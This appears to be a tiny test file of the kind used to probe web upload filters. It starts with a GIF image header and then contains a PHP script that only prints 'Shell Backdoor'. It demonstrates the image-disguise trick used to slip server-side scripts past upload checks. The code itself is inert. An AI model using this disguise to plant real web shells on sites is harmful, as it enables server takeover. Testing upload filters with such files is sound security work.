GIF89a;
<?php

echo "Shell Backdoor";